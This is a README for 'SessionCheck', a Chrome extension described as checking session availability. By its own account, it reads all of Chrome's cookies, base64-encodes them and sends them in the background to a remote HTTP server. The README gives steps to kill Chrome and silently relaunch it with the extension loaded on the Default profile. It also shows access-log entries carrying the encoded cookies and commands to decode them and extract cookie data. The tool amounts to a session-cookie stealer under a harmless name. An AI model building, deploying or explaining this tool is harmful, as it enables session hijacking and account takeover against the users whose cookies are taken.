# SessionCheck
SessionCheck is a Chrome extension to check session availability.

## Usage

Load the extension. It retrieve all cookies stored in Chrome and send them to a remote HTTP server in the background. Note that cookies are encoded with base64, then sent as a parameter value.

Typical way to use SessionCheck:

1. Launch an HTTP server to retrieve session information
1. Place SessionCheck under a directory
1. Terminate all Chrome processes
1. Launch Chrome again with `--load-extension` and `--profile-directory`
1. SessionCheck sends session information to the HTTP server
1. You can see the session information in the access log (see the Example section)

## Example

```
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000000&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000001&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000002&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000003&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000004&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000005&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000006&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000007&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
127.0.0.1 - - [DD/Aug/2022:HH:MM:SS +0000] "GET /js/chk.js?s=00000008&d=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX= HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
```


## Note

The following commands related to session check might help you for the session check.

Kill all Chrome processes:

```
taskkill /f /im:chrome.exe
```

Load this extension:

```
"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Default" --load-extension="C:/Path/to/SessionCheckDirectory" --restore-last-session
```

Base64 decode:
```
certutil -decode b64text.txt decoded.json
```

Extract cookie data from access.log
```
python3 ./parsesession.py -i test1234 -f ./access.log > cookie.json
```
